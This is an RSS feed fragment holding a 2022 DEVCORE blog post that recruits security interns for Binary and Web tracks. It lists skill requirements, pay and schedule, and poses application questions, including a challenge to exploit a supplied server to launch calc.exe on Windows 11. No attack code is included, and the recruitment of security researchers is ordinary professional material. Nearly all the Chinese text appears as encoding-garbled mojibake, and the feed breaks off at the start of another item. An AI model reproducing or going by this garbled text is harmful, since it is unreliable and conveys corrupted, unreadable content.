                <description>&lt;p&gt;DEVCORE Ëá™ 2012 ÊàêÁ´ã‰ª•‰æÜÂ∑≤ÈÇÅÂêëÁ¨¨ÂçÅÂπ¥ÔºåÊàëÂÄëÂæàÈáçË¶ñÂè∞ÁÅ£ÁöÑË≥áÂÆâÔºå‰πüÂ∞àÊ≥®ÊâæÂá∫ÊúÄÂö¥ÈáçÁöÑÂº±Èªû‰ª•‰øùË≠∑‰∏ñÁïå„ÄÇÈõñÁÑ∂ÂÖ¨Âè∏Ë¶èÊ®°Êì¥Âºµ‰∏çÂø´Ôºå‰ΩÜÂú®Êº∏Êº∏Á´ôÁ©©ËÖ≥Ê≠•ÁöÑÂêåÊôÇÔºåÊàëÂÄë‰ªç‰∏çÂøòÂàùË°∑ÔºöÂæû 2020 ÈñãÂßãÂú®ËºîÂ§ß„ÄÅÂè∞ÁßëÂ§ßÊàêÁ´ãË≥áÂÆâÁçéÂ≠∏ÈáëÔºõÂú® 2021 Âπ¥Êú´Êì¥Â§ß&lt;a href=&quot;https://devco.re/company/jobs/&quot;&gt;ÂæµÊâç&lt;/a&gt;ÔºåÊÉ≥ÊâæÂ∞ãÊúâËëóÁõ∏ÂêåÁêÜÂøµÁöÑ‰∫∫Êâç‰∏ÄËµ∑Â•ÆÈ¨•Ôºõ‰ªäÂπ¥Âπ¥ÂàùÔºåÊàëÂÄëÈñãÂßãÂòóË©¶ËàâËæ¶Á¨¨‰∏ÄÂ±ÜÂØ¶ÁøíÁîüË®àÁï´ÔºåÂ∏åÊúõÂüπËÇ≤‰∫∫Êâç„ÄÅÂ¢ûÂº∑Êñ∞‰∏ñ‰ª£ÁöÑË≥áÂÆâÊäÄËÉΩÔºåÊúÄÁµÇÊàêÊûú‰πüË∂Ö‰πéÈ†êÊúü„ÄÇÊñºÊòØÊàëÂÄëÊ±∫ÂÆöÂú®‰ªäÂπ¥ 9 ÊúàÈÄ≤Ë°åÁ¨¨‰∫åÂ±ÜÂØ¶ÁøíÁîüË®àÁï´ÔºåÂ¶ÇÊûúÊÇ®Â∞çÈÄôÂÄãË®àÁï´ÊúâËààË∂£ÔºåÊ≠°Ëøé‰æÜ‰ø°Â†±ÂêçÔºÅ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;ÂØ¶ÁøíÂÖßÂÆπ&quot;&gt;ÂØ¶ÁøíÂÖßÂÆπ&lt;/h3&gt;

&lt;p&gt;Êú¨Ê¨°ÂØ¶ÁøíÂàÜÁÇ∫ Binary Âèä Web ÂÖ©ÂÄãÁµÑÂà•Ôºå‰∏ªË¶ÅÂÖßÂÆπÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Binary
‰ª•Á†îÁ©∂ÁÇ∫‰∏ªÔºåÂú®ËàáÂ∞éÂ∏´Á¢∫ÂÆöÁ†îÁ©∂Ê®ôÁöÑÂæåÔºåÂàÜÊûêÁõÆÊ®ôÊû∂Êßã„ÄÅÈÄ≤Ë°åÈÄÜÂêëÂ∑•Á®ãÊàñÁ®ãÂºèÁ¢ºÂØ©Êü•„ÄÇËóâÁî±ÈÄôÂÄãÈÅéÁ®ãË®ìÁ∑¥Ëá™Â∑±ÁöÑÊÄùË∑ØÔºåÊâæÂá∫ÂèØËÉΩÁöÑÊîªÊìäÈù¢ËàáÊΩõÂú®ÁöÑÂº±Èªû„ÄÇÂè¶Â§ñ‰πüÊúÉËÆìÂ§ßÂÆ∂ÂòóË©¶ÂØ´ÈÅéÂæÄÊºèÊ¥ûÁöÑ Exploit ÁêÜËß£ÈÅéÂéªÊºèÊ¥ûÈÉΩÂá∫ÁèæÂú®Âì™ÔºåÈ´îÈ©óÁúüÂØ¶‰∏ñÁïåÁöÑÊºèÊ¥ûÈÉΩÊòØÂ¶Ç‰ΩïÂà©Áî®„ÄÇ
    &lt;ul&gt;
      &lt;li&gt;ÊºèÊ¥ûÊåñÊéòÂèäÁ†îÁ©∂ 70 %&lt;/li&gt;
      &lt;li&gt;1-day ÈñãÁôº (Exploitation) 30 %&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Web
‰∏ªË¶ÅÂÖßÂÆπÁÇ∫Âú®Â∞éÂ∏´ÊåáÂºïËàáËºî‰Ωê‰∏ãÁ†îÁ©∂ÈÅéÂæÄÊºèÊ¥ûËàáËøëÂπ¥Â∏∏Ë¶ãÊñ∞ÂûãÊÖãÊºèÊ¥û„ÄÅÊîªÊìäÊâãÊ≥ïÔºåÈúÄË¶ÅË£Ω‰ΩúÊäïÂΩ±Áâá‰ªãÁ¥πÊàêÊûú‰∏¶Âª∫ÁΩÆÂèØ‰æõ‰ªñ‰∫∫ÈáçÁèæÂº±ÈªûÁöÑÊ®°Êì¨Ê∏¨Ë©¶Áí∞Â¢É (Lab)ÔºåÂè¶ÂèØËÉΩÈúÄË¶ÅÊí∞ÂØ´Êàñ‰øÆÊîπÂèØÂà©Áî®ÊîªÊìäÁ®ãÂºèÈÄ≤Ë°åÂº±ÈªûÈ©óË≠â„ÄÇ
    &lt;ul&gt;
      &lt;li&gt;ÊºèÊ¥ûÂèäÊîªÊìäÊâãÊ≥ïÁ†îÁ©∂ 70%&lt;/li&gt;
      &lt;li&gt;Âª∫ÁΩÆ Lab 30%&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÂÖ¨Âè∏Âú∞Èªû&quot;&gt;ÂÖ¨Âè∏Âú∞Èªû&lt;/h3&gt;

&lt;p&gt;Âè∞ÂåóÂ∏ÇÊùæÂ±±ÂçÄÂÖ´Âæ∑Ë∑Ø‰∏âÊÆµ 32 Ëôü 13 Ê®ì&lt;/p&gt;

&lt;h3 id=&quot;ÂØ¶ÁøíÊôÇÈñì&quot;&gt;ÂØ¶ÁøíÊôÇÈñì&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2022 Âπ¥ 9 ÊúàÈñãÂßãÂà∞ 2023 Âπ¥ 2 ÊúàÂ∫ïÔºåÂÖ± 6 ÂÄãÊúà„ÄÇ
    &lt;ul&gt;
      &lt;li&gt;ÂÇôË®ªÔºöËã•ÊáâÂæµ‰∫∫Êï∏ÈÅéÂ§öÔºåÊàëÂÄëË©ï‰º∞ÁÑ°Ê≥ïÂú® 08/26 ÂâçÊ±∫ÂÆö‰∫∫ÈÅ∏„ÄÇÊï¥È´îÂØ¶ÁøíÊôÇÈñìÂ∞áÊúÉÈ†ÜÂª∂‰∏ÄËá≥ÂÖ©ÈÄ±ÔºåÂ±ÜÊôÇÊúÉÊèêÊó©Áôº‰ø°ÈÄöÁü•ÊâÄÊúâÊáâÂæµËÄÖ„ÄÇ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÊØèÈÄ±Â∑•‰ΩúÂÖ©Â§©ÔºåÂ∑•‰ΩúÊôÇÈñìÁÇ∫ 10:00 ‚Äì 18:00
    &lt;ul&gt;
      &lt;li&gt;ÊØèÈÄ±Âõ∫ÂÆö‰∏ÄÂ§©‰∏ãÂçà 14:00 - 18:00 ÂøÖÈ†àÂà∞ÂÖ¨Âè∏Ë®éË´ñÈÄ≤Â∫¶&lt;/li&gt;
      &lt;li&gt;ÂÖ∂È§òÊôÇÈñìÁöÜÁÇ∫ÈÅ†Á´Ø‰ΩúÊ•≠&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÊãõÂãüÂ∞çË±°&quot;&gt;ÊãõÂãüÂ∞çË±°&lt;/h3&gt;

&lt;p&gt;Â§ßÂ∞àÈô¢Ê†°Â§ß‰∏âÔºàÂê´Ôºâ‰ª•‰∏äÂÖ∑Êúâ‰∏ÄÂÆöÁ®ãÂ∫¶Ë≥áÂÆâËÉåÊôØÁöÑÂ≠∏Áîü&lt;/p&gt;

&lt;h3 id=&quot;È†êË®àÊãõÊî∂ÂêçÈ°ç&quot;&gt;È†êË®àÊãõÊî∂ÂêçÈ°ç&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Binary ÁµÑÔºö2~3 ‰∫∫&lt;/li&gt;
  &lt;li&gt;Web ÁµÑÔºö2~3 ‰∫∫&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Ëñ™Ë≥áÂæÖÈÅá&quot;&gt;Ëñ™Ë≥áÂæÖÈÅá&lt;/h3&gt;

&lt;p&gt;ÊØèÊúàÊñ∞Âè∞Âπ£ 16,000 ÂÖÉ&lt;/p&gt;

&lt;h2 id=&quot;ÊãõÂãüÊ¢ù‰ª∂Ë≥áÊ†ºËàáÊµÅÁ®ã&quot;&gt;ÊãõÂãüÊ¢ù‰ª∂Ë≥áÊ†ºËàáÊµÅÁ®ã&lt;/h2&gt;

&lt;h3 id=&quot;ÂØ¶ÁøíÊ¢ù‰ª∂Ë¶ÅÊ±Ç&quot;&gt;ÂØ¶ÁøíÊ¢ù‰ª∂Ë¶ÅÊ±Ç&lt;/h3&gt;

&lt;h4 id=&quot;binary&quot;&gt;Binary&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Âü∫Êú¨ÈÄÜÂêëÂ∑•Á®ãÂèäÈô§ÈåØËÉΩÂäõ
    &lt;ul&gt;
      &lt;li&gt;ËÉΩÁúãÊáÇÁµÑÂêàË™ûË®Ä‰∏¶Áû≠Ëß£Âü∫Êú¨ Debugger ‰ΩøÁî®ÊäÄÂ∑ß&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Âü∫Êú¨ÊºèÊ¥ûÂà©Áî®ËÉΩÂäõ
    &lt;ul&gt;
      &lt;li&gt;È†àÁü•ÈÅì Stack overflow„ÄÅROP Á≠âÁõ∏ÈóúÂà©Áî®ÊäÄÂ∑ß&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Âü∫Êú¨ Scripting Language ÈñãÁôºËÉΩÂäõ
    &lt;ul&gt;
      &lt;li&gt;Python„ÄÅRuby&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÂàÜÊûêÂ§ßÂûã Open Source Â∞àÊ°àËÉΩÂäõ
    &lt;ul&gt;
      &lt;li&gt;‰ª• C/C++ ÁÇ∫‰∏ª&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÂü∫Á§é‰ΩúÊ•≠Á≥ªÁµ±Áü•Ë≠ò
    &lt;ul&gt;
      &lt;li&gt;‰æãÂ¶ÇÁü•ÈÅì Virtual Address Ëàá Physical Address ÁöÑÊ¶ÇÂøµ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Code Auditing
    &lt;ul&gt;
      &lt;li&gt;Áü•ÈÅìÊÄéÊ®£ÂØ´ÁöÑÁ®ãÂºèÁ¢ºÊúÉÊúâÂïèÈ°å
        &lt;ul&gt;
          &lt;li&gt;Buffer Overflow&lt;/li&gt;
          &lt;li&gt;Use After free&lt;/li&gt;
          &lt;li&gt;Race Condition&lt;/li&gt;
          &lt;li&gt;‚Ä¶&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÁ†îÁ©∂ÁÜ±Ë™†ÔºåÁøíÊÖ£‰∫ÜËß£ÊäÄË°ìÊú¨Ë≥™&lt;/li&gt;
  &lt;li&gt;Âä†ÂàÜ‰ΩÜ&lt;strong&gt;ÈùûÂøÖË¶Å&lt;/strong&gt;Ê¢ù‰ª∂
    &lt;ul&gt;
      &lt;li&gt;CTF ÊØîË≥ΩÁ∂ìÈ©ó&lt;/li&gt;
      &lt;li&gt;pwnable.tw ÊàêÁ∏æ&lt;/li&gt;
      &lt;li&gt;Ê®ÇÊñºÂàÜ‰∫´ÊäÄË°ì
        &lt;ul&gt;
          &lt;li&gt;ÊúâÂÖ¨ÈñãÁöÑÊäÄË°ì blog/slide„ÄÅWrite-ups ÊàñÊòØÊºîË¨õ&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Á≤æÈÄö IDA Pro Êàñ Ghidra&lt;/li&gt;
      &lt;li&gt;ÊúâÂØ´ÈÅé 1-day Âà©Áî®Á®ãÂºè&lt;/li&gt;
      &lt;li&gt;ÂÖ∑ÂÇô‰∏ãÂàóÂÖ∂‰∏≠‰πã‰∏ÄÁ∂ìÈ©ó
        &lt;ul&gt;
          &lt;li&gt;Kernel Exploit&lt;/li&gt;
          &lt;li&gt;Windows Exploit&lt;/li&gt;
          &lt;li&gt;Browser Exploit&lt;/li&gt;
          &lt;li&gt;Bug Bounty&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;web&quot;&gt;Web&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;ÁÜüÊÇâ OWASP Web Top 10„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁêÜËß£ PortSwigger Web Security Academy ‰∏≠ÊâÄÊúâÁöÑÂÆâÂÖ®Ë≠∞È°åÊàñÂ∑≤ÂÆåÊàêÊâÄÊúâ Lab„ÄÇ
    &lt;ul&gt;
      &lt;li&gt;ÂèÉËÄÉÈÄ£ÁµêÔºöhttps://portswigger.net/web-security/all-materials&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÁêÜËß£Ë®àÁÆóÊ©üÁ∂≤Ë∑ØÁöÑÂü∫Êú¨Ê¶ÇÂøµ„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâ Command Line Êìç‰ΩúÔºåÂåÖÂê´ Unix-like Âíå Windows ‰ΩúÊ•≠Á≥ªÁµ±ÁöÑÂ∏∏Ë¶ãÊàñÂÖßÂª∫Á≥ªÁµ±Êåá‰ª§Â∑•ÂÖ∑„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâ‰ªª‰∏ÄÁ®ÆÁ∂≤È†ÅÁ®ãÂºèË™ûË®ÄÔºàÂ¶ÇÔºöPHP„ÄÅASP.NET„ÄÅJSPÔºâÔºåÂÖ∑ÂÇôÂèØ‰ª•Âª∫Á´ãÂÆåÊï¥Á∂≤È†ÅÊúçÂãôÁöÑËÉΩÂäõ„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâ‰ªª‰∏ÄÁ®Æ Scripting LanguageÔºàÂ¶ÇÔºöShell Script„ÄÅPython„ÄÅRubyÔºâÔºå‰∏¶ËÉΩ‰ΩøÁî®ËÖ≥Êú¨Ëºî‰ª•Á†îÁ©∂„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÈô§ÈåØËÉΩÂäõÔºåËÉΩÂñÑÁî® Debugger ËøΩËπ§Á®ãÂºèÊµÅÁ®ã„ÄÅËÉΩÈáçÁèæ‰∏¶Êî∂ÊñÇÂïèÈ°å„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÂèØ‰ª•Âª∫ÁΩÆ„ÄÅË®≠ÂÆöÂ∏∏Ë¶ãÁ∂≤È†Å‰º∫ÊúçÂô®ÔºàÂ¶ÇÔºöNginx„ÄÅApacheÔºâÂèä‰ΩúÊ•≠Á≥ªÁµ±ÔºàÂ¶ÇÔºöLinuxÔºâÁöÑËÉΩÂäõ„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôËøΩÊ†πÁ©∂Êü¢ÁöÑÁ≤æÁ•û„ÄÇ&lt;/li&gt;
  &lt;li&gt;Âä†ÂàÜ‰ΩÜ&lt;strong&gt;ÈùûÂøÖË¶Å&lt;/strong&gt;Ê¢ù‰ª∂
    &lt;ul&gt;
      &lt;li&gt;ÊõæÁ∂ìÁç®Á´ãÊåñÊéòÈÅé 0-day ÊºèÊ¥û„ÄÇ&lt;/li&gt;
      &lt;li&gt;ÊõæÁ∂ìÁç®Á´ãÂàÜÊûêÈÅéÂ∑≤Áü•ÊºèÊ¥û‰∏¶ËÉΩÊí∞ÂØ´ 1-day exploit„ÄÇ&lt;/li&gt;
      &lt;li&gt;ÊõæÁ∂ìÊñº CTF ÊØîË≥Ω‰∏≠Êìî‰ªªÂá∫È°åËÄÖ‰∏¶Âª∫ÁΩÆÈÅéÈ°åÁõÆ„ÄÇ&lt;/li&gt;
      &lt;li&gt;ÊìÅÊúâ OSCP Ë≠âÁÖßÊàñÂêåÁ≠âËÉΩÂäõ‰πãË≠âÁÖß„ÄÇ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÊáâÂæµÊµÅÁ®ã&quot;&gt;ÊáâÂæµÊµÅÁ®ã&lt;/h3&gt;

&lt;p&gt;Êú¨Ê¨°ÁîÑÈÅ∏‰∏ÄÂÖ±ÂàÜÁÇ∫‰∫åÂÄãÈöéÊÆµÔºö&lt;/p&gt;

&lt;h4 id=&quot;Á¨¨‰∏ÄÈöéÊÆµÊõ∏Èù¢ÂØ©Êü•&quot;&gt;Á¨¨‰∏ÄÈöéÊÆµÔºöÊõ∏Èù¢ÂØ©Êü•&lt;/h4&gt;

&lt;p&gt;Á¨¨‰∏ÄÈöéÊÆµÁÇ∫Êõ∏Èù¢ÂØ©Êü•ÔºåÊúÉÈúÄË¶ÅÂØ©Êü•‰∏ãÂàóÂÖ©ÂÄãÈ†ÖÁõÆ&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Â±•Ê≠∑Ë≥áÊ†ºÂØ©Êü•&lt;/li&gt;
  &lt;li&gt;ÂïèÁ≠îÈ°åÁ≠îÊ°àÔºàÂÖ± 2 È°åÔºåÂêÑÁµÑÂà•È°åÁõÆ‰∏çÂêåÔºåË©≥Ë¶ã‰∏ãÊñπ&lt;a href=&quot;/blog/2022/07/25/2nd-internship-program-recruit/#:~:text=È°åÁõÆÂ¶Ç‰∏ã&quot;&gt;Â†±ÂêçÊñπÂºè&lt;/a&gt;Ôºâ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÊàëÂÄëÊúÉÊ†πÊìöÊÇ®ÁöÑÂ±•Ê≠∑ÂèäÊâÄÂõûÁ≠îÁöÑÂÖßÂÆπ‰æÜÊ±∫ÂÆöÊòØÂê¶ÊúâÈÄöÈÅéÁ¨¨‰∏ÄÈöéÊÆµÔºåÊúÉÂú®‰∏ÉÂÄãÂ∑•‰ΩúÂ§©ÂÖßÂõûË¶Ü„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;Á¨¨‰∫åÈöéÊÆµÈù¢Ë©¶&quot;&gt;Á¨¨‰∫åÈöéÊÆµÔºöÈù¢Ë©¶&lt;/h4&gt;

&lt;p&gt;Ê≠§ÈöéÊÆµÁÇ∫ 1~2 Â∞èÊôÇÁöÑÈù¢Ë©¶ÔºåÊúÉÊúâ 2~3 ‰ΩçË≥áÊ∑±Â§•‰º¥ÂèÉËàáÔºåË©ï‰º∞ÊÇ®ÊòØÂê¶ÂÖ∑ÂÇôÊú¨Ê¨°ÂØ¶ÁøíÊâÄÈúÄÁöÑÊäÄË°ìËÉΩÂäõËàá‰∫∫Ê†ºÁâπË≥™„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;Â†±ÂêçÊñπÂºè&quot;&gt;Â†±ÂêçÊñπÂºè&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Ë´ãÂ∞áÊÇ®ÁöÑ&lt;strong&gt;Â±•Ê≠∑&lt;/strong&gt;Âèä&lt;strong&gt;È°åÁõÆÁ≠îÊ°à&lt;/strong&gt;‰ª• PDF Ê†ºÂºèÂØÑÂà∞ recruiting_intern@devco.re
    &lt;ul&gt;
      &lt;li&gt;Â±•Ê≠∑Ê†ºÂºèË´ãÂèÉËÄÉÁØÑ‰æãÁ§∫ÊÑèÔºà&lt;a href=&quot;/assets/files/recruit/Resume_Example.docx&quot;&gt;DOCX&lt;/a&gt;„ÄÅ&lt;a href=&quot;/assets/files/recruit/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;„ÄÅ&lt;a href=&quot;/assets/files/recruit/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;Ôºâ‰∏¶ËΩâÊàê PDF„ÄÇËã•ÊÇ®ÊúâËá™‰ø°Ôºå‰πüÂèØ‰ª•Ëá™Áî±ÁôºÊèÆÊúÄËÉΩÂëàÁèæÊÇ®ËÉΩÂäõÁöÑÂ±•Ê≠∑„ÄÇ&lt;/li&gt;
      &lt;li&gt;Ë´ãÊñº 2022/08/12Ôºà‰∫îÔºâ23:59 ÂâçÂØÑÂá∫ÔºàÂ¶ÇÊûúÂêçÈ°çÂ∑≤ÊªøÂâáË¶ñÊÉÖÊ≥ÅÊèêÊó©ÁµêÊùüÔºâ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;‰ø°‰ª∂Ê®ôÈ°åÊ†ºÂºèÔºö[ÊáâÂæµ] ËÅ∑‰Ωç ÊÇ®ÁöÑÂßìÂêçÔºàÁØÑ‰æãÔºö[ÊáâÂæµ] Web ÁµÑÂØ¶ÁøíÁîü ÁéãÂ∞èÁæéÔºâ&lt;/li&gt;
  &lt;li&gt;Â±•Ê≠∑ÂÖßÂÆπË´ãÂãôÂøÖÊéßÂà∂Âú®‰∏âÈ†Å‰ª•ÂÖßÔºåËá≥Â∞ëÈúÄÂåÖÂê´‰ª•‰∏ãÂÖßÂÆπÔºö
    &lt;ul&gt;
      &lt;li&gt;Âü∫Êú¨Ë≥áÊñô&lt;/li&gt;
      &lt;li&gt;Â≠∏Ê≠∑&lt;/li&gt;
      &lt;li&gt;ÂØ¶ÁøíÁ∂ìÊ≠∑&lt;/li&gt;
      &lt;li&gt;Á§æÁæ§Ê¥ªÂãïÁ∂ìÊ≠∑&lt;/li&gt;
      &lt;li&gt;ÁâπÊÆä‰∫ãËπü&lt;/li&gt;
      &lt;li&gt;ÈÅéÂéªÂ∞çÊñºË≥áÂÆâÁöÑÁõ∏ÈóúÁ†îÁ©∂&lt;/li&gt;
      &lt;li&gt;Â∞çÊñºÈÄô‰ªΩÂØ¶ÁøíÁöÑÊúüÊúõ&lt;/li&gt;
      &lt;li&gt;MBTI ËÅ∑Ê•≠ÊÄßÊ†ºÊ∏¨Ë©¶ÁµêÊûúÔºà&lt;a href=&quot;https://www.apesk.com/mbti/dati_tw.asp&quot;&gt;Ê∏¨Ë©¶Á∂≤È†Å&lt;/a&gt;Ôºâ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;È°åÁõÆÂ¶Ç‰∏ãÔºåË´ã‰æùÁÖßÊ¨≤Áî≥Ë´ã‰πãÁµÑÂà•ÂõûÁ≠î
    &lt;ul&gt;
      &lt;li&gt;Binary
        &lt;ul&gt;
          &lt;li&gt;Á∞°Á≠îÈ°å
            &lt;ul&gt;
              &lt;li&gt;ÂÅáË®≠‰Ω†‰ªäÂ§©Ë¶ÅÂàÜÊûê‰∏ÄÂè∞Âç∞Ë°®Ê©ü
                &lt;ul&gt;
                  &lt;li&gt;‰Ω†ÊúÉÂ¶Ç‰ΩïÂéªÂàÜÊûê ?&lt;/li&gt;
                  &lt;li&gt;‰Ω†Ë¶∫ÂæóÊúâÂì™‰∫õÂú∞ÊñπÂèØËÉΩÊúÉÁôºÁîüÂïèÈ°åÂ∞éËá¥ÊîªÊìäËÄÖÂèØ‰ª•Áç≤ÂæóÂç∞Ë°®Ê©üÊéßÂà∂Ê¨ä? ÁÇ∫‰ªÄÈ∫º ?&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;ÂØ¶‰ΩúÈ°åÁõÆ
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;/assets/files/recruit/binary/2022_Intern_Challenge.zip&quot;&gt;È°åÁõÆÊ™îÊ°à&lt;/a&gt;
                &lt;ul&gt;
                  &lt;li&gt;ÁÇ∫‰∏ÄÂÄã‰∫íÂãïÂºèÁöÑ ServerÔºåÂèØÈÄèÈÅéÁ∂≤Ë∑ØÈÄ£Á∑öËàá‰πã‰∫íÂãï„ÄÇ&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;Ë´ãÂàÜÊûê‰∏äËø∞ÊâÄÊèê‰æõÁöÑ ServerÔºå‰∏¶Âà©Áî®ÂÖ∂‰∏≠ÁöÑÊºèÊ¥ûÂú® Windows 11 ‰∏äË∑≥Âá∫ calc.exe„ÄÇ
                &lt;ul&gt;
                  &lt;li&gt;ÊºèÊ¥ûÂèØËÉΩÊúâÂæàÂ§öÔºå‰∏ç‰∏ÄÂÆöÊØèÂÄãÈÉΩÂèØ‰ª•Âà©Áî®„ÄÇ&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;Ë´ãÂãôÂøÖÂØ´‰∏ãËß£È°åÈÅéÁ®ãÂèäÂ¶Ç‰ΩïÂéªÂàÜÊûêÈÄôÂÄã ServerÔºå‰∏¶‰∫§ write-upÔºåË´ãÁõ°‰Ω†ÊâÄËÉΩ‰æÜËß£È°åÔºåÂç≥‰ΩøÊúÄÂæåÊ≤íÊúâÊàêÂäüÔºå‰πüË´ãÂØ´‰∏ãÊÇ®ÊâÄÂòóË©¶ÈÅéÁöÑÊñπÊ≥ïÂèäÊÄùË∑ØÔºåÊú¨Ê∏¨È©óÂ∞áÊúÉ‰ª• write-up ÁÇ∫‰∏ªË¶Å‰æùÊìö„ÄÇ&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Web
        &lt;ul&gt;
          &lt;li&gt;Áï∂‰Ω†Âú®Á∂≤È†ÅÁÄèË¶ΩÂô®ÁöÑÁ∂≤ÂùÄÂàó‰∏äËº∏ÂÖ•‰∏Ä‰∏≤Á∂≤ÂùÄÔºà‰æãÂ¶ÇÔºö&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://site.fake.devco.re/index.php?foo=bar&lt;/code&gt;ÔºâÔºåÈö®ÂæåÊåâ‰∏ã Enter ÈçµÂà∞Âá∫ÁèæÁ∂≤È†ÅÁï´Èù¢ÁÇ∫Ê≠¢ÔºåË´ãÂïè‰∏≠ÈñìÁôºÁîü‰∫Ü‰ªÄÈ∫º‰∫ãÊÉÖÔºüË´ãÊ†πÊìö‰Ω†ÊâÄÁü•ÁöÑÁü•Ë≠òËÉåÊôØÔºå‰ª•ÊñáÂ≠óÁõ°ÂèØËÉΩË™™Êòé„ÄÇ&lt;/li&gt;
          &lt;li&gt;Ë´ãÊèêÂá∫‰∏âÂÄãÔºå‰Ω†Âç∞Ë±°ÊúÄÊ∑±ÂàªÊàñÊÑüÂà∞ÊúâË∂£„ÄÅÊñºË•øÂÖÉ 2020 ~ 2022 Âπ¥ÈñìÂÖ¨ÈñãÁöÑÁúüÂØ¶ÊºèÊ¥ûÊàñÊîªÊìäÈèàÊ°à‰æãÔºå‰∏¶‰æùËá™Â∑±ÁöÑÁêÜËß£Á∞°Ëø∞Ë™™ÊòéÂêÑÂÄãÊºèÊ¥ûÁöÑÊàêÂõ†„ÄÅÂà©Áî®Ê¢ù‰ª∂ÂíåÂèØ‰ª•ÈÄ†ÊàêÁöÑÂΩ±ÈüøÔºå‰ª•ÂèäÊâÄÂ∞çÊáâÂà∞ÁöÑ OWASP Top 10 / CWE È°ûÂà•„ÄÇ&lt;/li&gt;
          &lt;li&gt;Ôºà‰∏äËø∞È°åÁõÆÂª∫Ë≠∞Êí∞ÂØ´ 1~2 È†ÅÂç≥ÂèØÔºâ&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ëã•ÊúâÊáâÂæµÁõ∏ÈóúÂïèÈ°åÔºåË´ã‰∏ÄÂæã‰ΩøÁî® Email ËÅØÁπ´ÔºåÂ¶ÇÈÄ†ÊàêÊÇ®ÁöÑ‰∏ç‰æøË´ãË¶ãË´íÔºåÊàëÂÄëÊÑüË¨ùÊÇ®ÁöÑ‰æÜ‰ø°Ôºå‰∏¶ÊúüÂæÖÊÇ®ÁöÑÂä†ÂÖ•ÔºÅ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2022/07/25/2nd-internship-program-recruit/</link>
                <guid>https://devco.re/blog/2022/07/25/2nd-internship-program-recruit</guid>
                <pubDate>Mon, 25 Jul 2022 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Your NAS is not your NAS !</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2022/03/28/your-NAS-is-not-your-NAS-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2022/03/28/your-NAS-is-not-your-NAS/&quot;&gt;‰∏≠ÊñáÁâàÊú¨&lt;/a&gt;&lt;/p&gt;

